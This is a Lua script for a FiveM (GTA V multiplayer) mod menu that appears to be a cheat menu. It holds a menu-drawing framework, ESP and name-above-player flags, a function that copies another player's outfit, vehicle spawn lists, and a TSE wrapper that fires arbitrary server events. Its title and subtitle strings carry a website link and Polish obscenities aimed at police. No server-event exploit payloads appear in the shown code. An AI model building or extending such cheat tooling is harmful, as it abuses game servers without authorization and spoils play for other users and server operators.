local titolo = "https://dc.xaries.pl v0.2"
local pisellone = PlayerId(-1)
local pisello = GetPlayerName(pisellone)
local showblip = false
local showsprite = false
local nameabove = true
local esp = true
local LR = {}

LR.debug = false

local function RGB(frequency)
  local result = {}
  local curtime = GetGameTimer() / 2000
  result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
  result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
  result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

  return result
end

local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 176, back = 177}
local optionCount = 1
local currentKey = nil
local currentMenu = nil
local menuWidth = 0.18
local titleHeight = 0.05
local titleYOffset = 0.01
local titleScale = 0.5
local buttonHeight = 0.035
local buttonFont = 4
local buttonScale = 0.370
local buttonTextXOffset = 0.002
local buttonTextYOffset = 0.005
local descHeight = 0.035
local descFont = 1
local descXOffset = 0.003
local descScale = 0.370
local bytexd = "JEBAC STARE KURWY I MLODYCH POLICJANTOW"
local MenuWider = nil
local function debugPrint(text)
  if LR.debug then
    Citizen.Trace("[LR] " .. tostring(text))
  end
end

local function setMenuProperty(id, property, value)
  if id and menus[id] then
    menus[id][property] = value
    debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
  end
end

local function isMenuVisible(id)
  if id and menus[id] then
    return menus[id].visible
  else
    return false
  end
end

local function setMenuVisible(id, visible, holdCurrent)
  if id and menus[id] then
    setMenuProperty(id, "visible", visible)

    if not holdCurrent and menus[id] then
      setMenuProperty(id, "currentOption", 1)
    end

    if visible then
      if id ~= currentMenu and isMenuVisible(currentMenu) then
        setMenuVisible(currentMenu, false)
      end

      currentMenu = id
    end
  end
end

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
  SetTextColour(color.r, color.g, color.b, color.a)
  SetTextFont(font)
  SetTextScale(scale, scale)

  if shadow then
    SetTextDropShadow(2, 2, 0, 0, 0)
  end

  if menus[currentMenu] then
    if center then
      SetTextCentre(center)
    elseif alignRight then
      SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
      SetTextRightJustify(true)
    end
  end
  SetTextEntry("STRING")
  AddTextComponentString(text)
  DrawText(x, y)
end

local function drawRect(x, y, width, height, color)
  DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

local function drawTitle()
  if menus[currentMenu] then
    local x = menus[currentMenu].x + menuWidth / 2
    local y = menus[currentMenu].y + titleHeight / 2

    if menus[currentMenu].titleBackgroundSprite then
      DrawSprite(
      menus[currentMenu].titleBackgroundSprite.dict,
      menus[currentMenu].titleBackgroundSprite.name,
      x,
      y,
      menuWidth,
      titleHeight,
      0.,
      255,
      255,
      255,
      255
      )
    else
      drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
    end

    drawText(
    menus[currentMenu].title,
    x,
    y - titleHeight / 2 + titleYOffset,
    menus[currentMenu].titleFont,
    menus[currentMenu].titleColor,
    titleScale,
    true
    )
  end
end

local function drawSubTitle()
  if menus[currentMenu] then
    local x = menus[currentMenu].x + menuWidth / 2
    local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

    local rgb = RGB(0.5)

    local subTitleColor = {
      r=rgb.r,
      g=rgb.g,
      b=rgb.b,
      a = 255
    }

    drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
    drawText(
    menus[currentMenu].subTitle,
    menus[currentMenu].x + buttonTextXOffset,
    y - buttonHeight / 2 + buttonTextYOffset,
    buttonFont,
    subTitleColor,
    buttonScale,
    false
    )

    if optionCount > menus[currentMenu].maxOptionCount then
      drawText(
      tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
      menus[currentMenu].x + menuWidth,
      y - buttonHeight / 2 + buttonTextYOffset,
      buttonFont,
      subTitleColor,
      buttonScale,
      false,
      false,
      true
      )
    end
  end
end

local function drawDescription(desc, descYOffset, ky)
  if menus[currentMenu] then
    local x = menus[currentMenu].x + menuWidth / 2
    local y = menus[currentMenu].y + descHeight / 2
    local ra = RGB(5.0)
    local descriptionColor = {
      r = ra.r,
      g = ra.b,
      b = 255,
      a = 255
    }

    drawRect(x, y + ky, menuWidth, descHeight, descriptionBackgroundColor)

    drawText(
    desc,
    menus[currentMenu].x + descXOffset,
    y - descHeight / 2 + descYOffset + 0.005,
    descFont,
    descriptionColor,
    descScale,
    false
    )
  end
end

local function drawButton(text, subText)
  local x = menus[currentMenu].x + menuWidth / 2
  local multiplier = nil

  if
  menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and
  optionCount <= menus[currentMenu].maxOptionCount
  then
    multiplier = optionCount
  elseif
    optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
    optionCount <= menus[currentMenu].currentOption
    then
      multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
    end

    if multiplier then
      local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
      local backgroundColor = nil
      local textColor = nil
      local subTextColor = nil
      local shadow = false

      if menus[currentMenu].currentOption == optionCount then
        backgroundColor = menus[currentMenu].menuFocusBackgroundColor
        textColor = menus[currentMenu].menuFocusTextColor
        subTextColor = menus[currentMenu].menuFocusTextColor
      else
        backgroundColor = menus[currentMenu].menuBackgroundColor
        textColor = menus[currentMenu].menuTextColor
        subTextColor = menus[currentMenu].menuSubTextColor
        shadow = true
      end

      drawRect(x, y, menuWidth, buttonHeight, backgroundColor)
      drawText(
      text,
      menus[currentMenu].x + buttonTextXOffset,
      y - (buttonHeight / 2) + buttonTextYOffset,
      buttonFont,
      textColor,
      buttonScale,
      false,
      shadow
      )

      if subText then
        drawText(
        subText,
        menus[currentMenu].x + buttonTextXOffset,
        y - buttonHeight / 2 + buttonTextYOffset,
        buttonFont,
        subTextColor,
        buttonScale,
        false,
        shadow,
        true
        )
      end
    end
  end


  function LR.CreateMenu(id, title)
    -- Default settings
    menus[id] = {}
    menus[id].title = titolo
    menus[id].subTitle = "KOCHAĆ XARIESA JEBAĆ FIVEMA"


    menus[id].visible = false

    menus[id].previousMenu = nil

    menus[id].aboutToBeClosed = false

menus[id].x = 0.65
menus[id].y = 0.15

    menus[id].currentOption = 1
    menus[id].maxOptionCount = 15
    menus[id].titleFont = 1
    Citizen.CreateThread(
    function()
      while true do
        Citizen.Wait(0)
        local ra = RGB(2.0)
        menus[id].titleColor = {r = ra.r, g = ra.g, b = ra.b, a = 255}
      end
      end)
      Citizen.CreateThread(
      function()
        while true do
          Citizen.Wait(0)
          local ra = RGB(1.0)
          menus[id].menuFocusBackgroundColor = {r = ra.r, g = ra.g, b = ra.b, a = 100}
        end
        end)
        menus[id].titleBackgroundSprite = nil
        menus[id].titleBackgroundColor = {r = 1, g = 1, b = 1, a = 160}
        menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
        menus[id].menuSubTextColor = {r = 189, g = 189, b = 189, a = 255}
        menus[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
        menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 130}

        menus[id].subTitleBackgroundColor = {r = 255, g = 255, b = 255, a = 160}

        descriptionBackgroundColor =
        {
          r = menus[id].menuBackgroundColor.r,
          g = menus[id].menuBackgroundColor.g,
          b = menus[id].menuBackgroundColor.b,
          a = 125
        }
        menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}

        debugPrint(tostring(id) .. " menu created")
      end

      function LR.CreateSubMenu(id, parent, subTitle)
        if menus[parent] then
          LR.CreateMenu(id, menus[parent].title)

          if subTitle then
            setMenuProperty(id, "subTitle", (subTitle))
          else
            setMenuProperty(id, "subTitle", (menus[parent].subTitle))
          end

          setMenuProperty(id, "previousMenu", parent)

          setMenuProperty(id, "x", menus[parent].x)
          setMenuProperty(id, "y", menus[parent].y)
          setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
          setMenuProperty(id, "titleFont", menus[parent].titleFont)
          setMenuProperty(id, "titleColor", menus[parent].titleColor)
          setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
          setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
          setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
          setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
          setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
          setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
          setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
          setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
        else
          debugPrint("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist")
        end
      end

      function LR.CurrentMenu()
        return currentMenu
      end

      function LR.OpenMenu(id)
        if id and menus[id] then
          PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
          setMenuVisible(id, true)

          if menus[id].titleBackgroundSprite then
            RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
            while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
              Citizen.Wait(0)
            end
          end

          debugPrint(tostring(id) .. " menu opened")
        else
          debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
        end
      end

      function LR.IsMenuOpened(id)
        return isMenuVisible(id)
      end

      function LR.IsAnyMenuOpened()
        for id, _ in pairs(menus) do
          if isMenuVisible(id) then
            return true
          end
        end

        return false
      end

      function LR.IsMenuAboutToBeClosed()
        if menus[currentMenu] then
          return menus[currentMenu].aboutToBeClosed
        else
          return false
        end
      end

      function LR.CloseMenu()
        if menus[currentMenu] then
          if menus[currentMenu].aboutToBeClosed then
            menus[currentMenu].aboutToBeClosed = false
            setMenuVisible(currentMenu, false)
            debugPrint(tostring(currentMenu) .. " menu closed")
            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            optionCount = 0
            currentMenu = nil
            currentKey = nil
          else
            menus[currentMenu].aboutToBeClosed = true
            debugPrint(tostring(currentMenu) .. " menu about to be closed")
          end
        end
      end

      function LR.Button(text, subText)
        local buttonText = text
        if subText then
          buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
        end

        if menus[currentMenu] then
          optionCount = optionCount + 1

          local isCurrent = menus[currentMenu].currentOption == optionCount

          drawButton(text, subText)

          if isCurrent then
            if currentKey == keys.select then
              PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
              debugPrint(buttonText .. " button pressed")
              return true
            elseif currentKey == keys.left or currentKey == keys.right then
              PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
          end

          return false
        else
          debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")

          return false
        end
      end

      function LR.MenuButton(text, id)
        if menus[id] then
          if LR.Button(text) then
            setMenuVisible(currentMenu, false)
            setMenuVisible(id, true, true)

            return true
          end
        else
          debugPrint("Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist")
        end

        return false
      end

      function LR.CheckBox(text, bool, callback)
        local checked = "~r~OFF"
        if bool then
          checked = "~g~ON"
        end

        if LR.Button(text, checked) then
          bool = not bool
          debugPrint(tostring(text) .. " checkbox changed to " .. tostring(bool))
          callback(bool)

          return true
        end

        return false
      end

      local function revO()
        MenuWider = 0
      end

      function LR.ComboBox(text, items, currentIndex, selectedIndex, callback)
        local itemsCount = #items
        local selectedItem = items[currentIndex]
        local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

        if itemsCount > 1 and isCurrent then
          selectedItem = '- '..tostring(selectedItem)..' +'
        end

        if LR.Button(text, selectedItem) then
          selectedIndex = currentIndex
          callback(currentIndex, selectedIndex)
          return true
        elseif isCurrent then
          if currentKey == keys.left then
            if currentIndex > 1 then
              currentIndex = currentIndex - 1
            else
              currentIndex = itemsCount
            end
          elseif currentKey == keys.right then
            if currentIndex < itemsCount then
              currentIndex = currentIndex + 1
            else
              currentIndex = 1
            end
          end
        else
          currentIndex = selectedIndex
        end

        callback(currentIndex, selectedIndex)
        return false
      end

      function TSE(a,b,c,d,e,f,g,h,i,m)
        TriggerServerEvent(a,b,c,d,e,f,g,h,i,m)
      end

      function LR.Display()
        if isMenuVisible(currentMenu) then
          if menus[currentMenu].aboutToBeClosed then
            LR.CloseMenu()
          else
            ClearAllHelpMessages()

            drawTitle()
            drawSubTitle()

            currentKey = nil

            if IsDisabledControlJustPressed(0, keys.down) then
              PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

              if menus[currentMenu].currentOption < optionCount then
                menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
              else
                menus[currentMenu].currentOption = 1
              end
            elseif IsDisabledControlJustPressed(0, keys.up) then
              PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

              if menus[currentMenu].currentOption > 1 then
                menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
              else
                menus[currentMenu].currentOption = optionCount
              end
            elseif IsDisabledControlJustPressed(0, keys.left) then
              currentKey = keys.left
            elseif IsDisabledControlJustPressed(0, keys.right) then
              currentKey = keys.right
            elseif IsDisabledControlJustPressed(0, keys.select) then
              currentKey = keys.select
            elseif IsDisabledControlJustPressed(0, keys.back) then
              if menus[menus[currentMenu].previousMenu] then
                PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                setMenuVisible(menus[currentMenu].previousMenu, true)
              else
                LR.CloseMenu()
              end
            end

            optionCount = 0
          end
        end
      end

      function LR.SetMenuWidth(id, width)
        setMenuProperty(id, "width", width)
      end

      function LR.SetMenuX(id, x)
        setMenuProperty(id, "x", x)
      end

      function LR.SetMenuY(id, y)
        setMenuProperty(id, "y", y)
      end

      function LR.SetMenuMaxOptionCountOnScreen(id, count)
        setMenuProperty(id, "maxOptionCount", count)
      end

      function LR.SetTitleColor(id, r, g, b, a)
        setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
      end

      function LR.SetTitleBackgroundColor(id, r, g, b, a)
        setMenuProperty(
        id,
        "titleBackgroundColor",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
        )
      end

      function LR.SetTitleBackgroundSprite(id, textureDict, textureName)
        setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
      end

      function LR.SetSubTitle(id, text)
        setMenuProperty(id, "subTitle", (text))
      end


      function LR.SetMenuBackgroundColor(id, r, g, b, a)
        setMenuProperty(
        id,
        "menuBackgroundColor",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
        )
      end

      function LR.SetMenuTextColor(id, r, g, b, a)
        setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
      end

      function LR.SetMenuSubTextColor(id, r, g, b, a)
        setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
      end

      function LR.SetMenuFocusColor(id, r, g, b, a)
        setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
      end

      function LR.SetMenuButtonPressedSound(id, name, set)
        setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
      end

      function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
		AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
		DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
        while (UpdateOnscreenKeyboard() == 0) do
          DisableAllControlActions(0)
          if IsDisabledControlPressed(0, 322) then return "" end
          Wait(0)
        end
        if (GetOnscreenKeyboardResult()) then
          local result = GetOnscreenKeyboardResult()
          return result
        end
      end

      function EnumeratePickups()
        return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
      end

      function AddVectors(vect1, vect2)
        return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
      end

      function SubVectors(vect1, vect2)
        return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
      end

      function ScaleVector(vect, mult)
        return vector3(vect.x*mult, vect.y*mult, vect.z*mult)
      end

      function GetSeatPedIsIn(ped)
        if not IsPedInAnyVehicle(ped, false) then return
      else
        veh = GetVehiclePedIsIn(ped)
        for i=0, GetVehicleMaxNumberOfPassengers(veh) do
          if GetPedInVehicleSeat(veh) then return i end
        end
      end
    end

    function GetCamDirFromScreenCenter()
      local pos = GetGameplayCamCoord()
      local world = ScreenToWorld(0, 0)
      local ret = SubVectors(world, pos)
      return ret
    end

    function ScreenToWorld(screenCoord)
      local camRot = GetGameplayCamRot(2)
      local camPos = GetGameplayCamCoord()

      local vect2x = 0.0
      local vect2y = 0.0
      local vect21y = 0.0
      local vect21x = 0.0
      local direction = RotationToDirection(camRot)
      local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
      local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
      local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)

      local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
      local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
      local radians = -(math.rad(camRot.y))

      vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
      vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))

      local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
      if not case1 then
        vect2x = x1
        vect2y = y1
        return camPos + (direction * 10.0)
      end

      local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
      if not case2 then
        vect21x = x2
        vect21y = y2
        return camPos + (direction * 10.0)
      end

      if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
        return camPos + (direction * 10.0)
      end

      local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
      local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
      return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

    end

    function WorldToScreenRel(worldCoords)
      local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
      if not check then
        return false
      end

      screenCoordsx = (x - 0.5) * 2.0
      screenCoordsy = (y - 0.5) * 2.0
      return true, screenCoordsx, screenCoordsy
    end

    function RotationToDirection(rotation)
      local retz = math.rad(rotation.z)
      local retx = math.rad(rotation.x)
      local absx = math.abs(math.cos(retx))
      return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
    end

    local function GetCamDirection()
      local heading = GetGameplayCamRelativeHeading()+GetEntityHeading(GetPlayerPed(-1))
      local pitch = GetGameplayCamRelativePitch()

      local x = -math.sin(heading*math.pi/180.0)
      local y = math.cos(heading*math.pi/180.0)
      local z = math.sin(pitch*math.pi/180.0)

      local len = math.sqrt(x*x+y*y+z*z)
      if len ~= 0 then
        x = x/len
        y = y/len
        z = z/len
      end

      return x,y,z
    end

    local function getPlayerIds()
      local players = {}
      for i = 0, GetNumberOfPlayers() do
        if NetworkIsPlayerActive(i) then
          players[#players + 1] = i
        end
      end
      return players
    end

	local function RandomSkin(target)
		local ped = GetPlayerPed(target)
		SetPedRandomComponentVariation(ped, false)
		SetPedRandomProps(ped)
	end

  local function GetResources()
    local resources = {}
    for i=0, GetNumResources() do
      resources[i] = GetResourceByFindIndex(i)
    end
    return resources
  end

  

	local function ClonePedlol(target)
		local ped = GetPlayerPed(target)
		local me = PlayerPedId()
		
		hat = GetPedPropIndex(ped, 0)
		hat_texture = GetPedPropTextureIndex(ped, 0)
		
		glasses = GetPedPropIndex(ped, 1)
		glasses_texture = GetPedPropTextureIndex(ped, 1)
		
		ear = GetPedPropIndex(ped, 2)
		ear_texture = GetPedPropTextureIndex(ped, 2)
		
		watch = GetPedPropIndex(ped, 6)
		watch_texture = GetPedPropTextureIndex(ped, 6)
		
		wrist = GetPedPropIndex(ped, 7)
		wrist_texture = GetPedPropTextureIndex(ped, 7)
		
		head_drawable = GetPedDrawableVariation(ped, 0)
		head_palette = GetPedPaletteVariation(ped, 0)
		head_texture = GetPedTextureVariation(ped, 0)
		
		beard_drawable = GetPedDrawableVariation(ped, 1)
		beard_palette = GetPedPaletteVariation(ped, 1)
		beard_texture = GetPedTextureVariation(ped, 1)
		
		hair_drawable = GetPedDrawableVariation(ped, 2)
		hair_palette = GetPedPaletteVariation(ped, 2)
		hair_texture = GetPedTextureVariation(ped, 2)
		
		torso_drawable = GetPedDrawableVariation(ped, 3)
		torso_palette = GetPedPaletteVariation(ped, 3)
		torso_texture = GetPedTextureVariation(ped, 3)
		
		legs_drawable = GetPedDrawableVariation(ped, 4)
		legs_palette = GetPedPaletteVariation(ped, 4)
		legs_texture = GetPedTextureVariation(ped, 4)
		
		hands_drawable = GetPedDrawableVariation(ped, 5)
		hands_palette = GetPedPaletteVariation(ped, 5)
		hands_texture = GetPedTextureVariation(ped, 5)
		
		foot_drawable = GetPedDrawableVariation(ped, 6)
		foot_palette = GetPedPaletteVariation(ped, 6)
		foot_texture = GetPedTextureVariation(ped, 6)
		
		acc1_drawable = GetPedDrawableVariation(ped, 7)
		acc1_palette = GetPedPaletteVariation(ped, 7)
		acc1_texture = GetPedTextureVariation(ped, 7)
		
		acc2_drawable = GetPedDrawableVariation(ped, 8)
		acc2_palette = GetPedPaletteVariation(ped, 8)
		acc2_texture = GetPedTextureVariation(ped, 8)
		
		acc3_drawable = GetPedDrawableVariation(ped, 9)
		acc3_palette = GetPedPaletteVariation(ped, 9)
		acc3_texture = GetPedTextureVariation(ped, 9)
		
		mask_drawable = GetPedDrawableVariation(ped, 10)
		mask_palette = GetPedPaletteVariation(ped, 10)
		mask_texture = GetPedTextureVariation(ped, 10)
		
		aux_drawable = GetPedDrawableVariation(ped, 11)
		aux_palette = GetPedPaletteVariation(ped, 11) 	
		aux_texture = GetPedTextureVariation(ped, 11)

		SetPedPropIndex(me, 0, hat, hat_texture, 1)
		SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
		SetPedPropIndex(me, 2, ear, ear_texture, 1)
		SetPedPropIndex(me, 6, watch, watch_texture, 1)
		SetPedPropIndex(me, 7, wrist, wrist_texture, 1)
		
		SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
		SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
		SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
		SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
		SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
		SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
		SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
		SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
		SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
		SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
		SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
		SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
	end


    function DrawText3D(x, y, z, text, r, g, b)
      SetDrawOrigin(x, y, z, 0)
      SetTextFont(0)
      SetTextProportional(0)
      SetTextScale(0.0, 0.20)
      SetTextColour(r, g, b, 255)
      SetTextDropshadow(0, 0, 0, 0, 255)
      SetTextEdge(2, 0, 0, 0, 150)
      SetTextDropShadow()
      SetTextOutline()
      SetTextEntry("STRING")
      SetTextCentre(1)
      AddTextComponentString(text)
      DrawText(0.0, 0.0)
      ClearDrawOrigin()
    end

    function math.round(num, numDecimalPlaces)
      return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
    end

    local function RGB(frequency)
      local result = {}
      local curtime = GetGameTimer() / 1000

      result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
      result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
      result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

      return result
    end

    function notify(text)
      SetNotificationTextEntry("STRING")
      AddTextComponentString(text)
      DrawNotification(true, false)
    end

    function checkValidVehicleExtras()
      local playerPed = PlayerPedId()
      local playerVeh = GetVehiclePedIsIn(playerPed, false)
      local valid = {}

      for i=0,50,1 do
        if(DoesExtraExist(playerVeh, i))then
          local realModname = "Extra #"..tostring(i)
          local text = "OFF"
          if(IsVehicleExtraTurnedOn(playerVeh, i))then
            text = "ON"
          end
          local realSpawnname = "extra "..tostring(i)
          table.insert(valid, {
            menuName=realModName,
            data ={
              ["action"] = realSpawnName,
              ["state"] = text
            }
          })
        end
      end

      return valid
    end


    function DoesVehicleHaveExtras( veh )
      for i = 1, 30 do
        if ( DoesExtraExist( veh, i ) ) then
          return true
        end
      end

      return false
    end


    function checkValidVehicleMods(modID)
      local playerPed = PlayerPedId()
      local playerVeh = GetVehiclePedIsIn(playerPed, false)
      local valid = {}
      local modCount = GetNumVehicleMods(playerVeh,modID)
      if (modID == 48 and modCount == 0) then


        local modCount = GetVehicleLiveryCount(playerVeh)
        for i=1, modCount, 1 do
          local realIndex = i - 1
          local modName = GetLiveryName(playerVeh, realIndex)
          local realModName = GetLabelText(modName)
          local modid, realSpawnName = modID, realIndex

          valid[i] = {
            menuName=realModName,
            data = {
              ["modid"] = modid,
              ["realIndex"] = realSpawnName
            }
          }
        end
      end

      for i = 1, modCount, 1 do
        local realIndex = i - 1
        local modName = GetModTextLabel(playerVeh, modID, realIndex)
        local realModName = GetLabelText(modName)
        local modid, realSpawnName = modCount, realIndex


        valid[i] = {
          menuName=realModName,
          data = {
            ["modid"] = modid,
            ["realIndex"] = realSpawnName
          }
        }
      end


      if(modCount > 0)then
        local realIndex = -1
        local modid, realSpawnName = modID, realIndex
        table.insert(valid, 1, {
          menuName="Stock",
          data = {
            ["modid"] = modid,
            ["realIndex"] = realSpawnName
          }
        })
      end

      return valid
    end

    local boats = {"Dinghy", "Dinghy2", "Dinghy3", "Dingh4", "Jetmax", "Marquis", "Seashark", "Seashark2", "Seashark3", "Speeder", "Speeder2", "Squalo", "Submersible", "Submersible2", "Suntrap", "Toro", "Toro2", "Tropic", "Tropic2", "Tug"}
    local Commercial = {"Benson", "Biff", "Cerberus", "Cerberus2", "Cerberus3", "Hauler", "Hauler2", "Mule", "Mule2", "Mule3", "Mule4", "Packer", "Phantom", "Phantom2", "Phantom3", "Pounder", "Pounder2", "Stockade", "Stockade3", "Terbyte"}
    local Compacts = {"Blista", "Blista2", "Blista3", "Brioso", "Dilettante", "Dilettante2", "Issi2", "Issi3", "issi4", "Iss5", "issi6", "Panto", "Prarire", "Rhapsody"}
    local Coupes = { "CogCabrio", "Exemplar", "F620", "Felon", "Felon2", "Jackal", "Oracle", "Oracle2", "Sentinel", "Sentinel2", "Windsor", "Windsor2", "Zion", "Zion2"}
    local cycles = { "Bmx", "Cruiser", "Fixter", "Scorcher", "Tribike", "Tribike2", "tribike3" }
    local Emergency = { "Ambulance", "FBI", "FBI2", "FireTruk", "PBus", "Police", "Police2", "Police3", "Police4", "PoliceOld1", "PoliceOld2", "PoliceT", "Policeb", "Polmav", "Pranger", "Predator", "Riot", "Riot2", "Sheriff", "Sheriff2"}
    local Helicopters = { "Akula", "Annihilator", "Buzzard", "Buzzard2", "Cargobob", "Cargobob2", "Cargobob3", "Cargobob4", "Frogger", "Frogger2", "Havok", "Hunter", "Maverick", "Savage", "Seasparrow", "Skylift", "Supervolito", "Supervolito2", "Swift", "Swift2", "Valkyrie", "Valkyrie2", "Volatus"}
    local Industrial = { "Bulldozer", "Cutter", "Dump", "Flatbed", "Guardian", "Handler", "Mixer", "Mixer2", "Rubble", "Tiptruck", "Tiptruck2"}
    local Military = { "APC", "Barracks", "Barracks2", "Barracks3", "Barrage", "Chernobog", "Crusader", "Halftrack", "Khanjali", "Rhino", "Scarab", "Scarab2", "Scarab3", "Thruster", "Trailersmall2"}
    local Motorcycles = { "Akuma", "Avarus", "Bagger", "Bati2", "Bati", "BF400", "Blazer4", "CarbonRS", "Chimera", "Cliffhanger", "Daemon", "Daemon2", "Defiler", "Deathbike", "Deathbike2", "Deathbike3", "Diablous", "Diablous2", "Double", "Enduro", "esskey", "Faggio2", "Faggio3", "Faggio", "Fcr2", "fcr", "gargoyle", "hakuchou2", "hakuchou", "hexer", "innovation", "Lectro", "Manchez", "Nemesis", "Nightblade", "Oppressor", "Oppressor2", "PCJ", "Ratbike", "Ruffian", "Sanchez2", "Sanchez", "Sanctus", "Shotaro", "Sovereign", "Thrust", "Vader", "Vindicator", "Vortex", "Wolfsbane", "zombiea", "zombieb"}
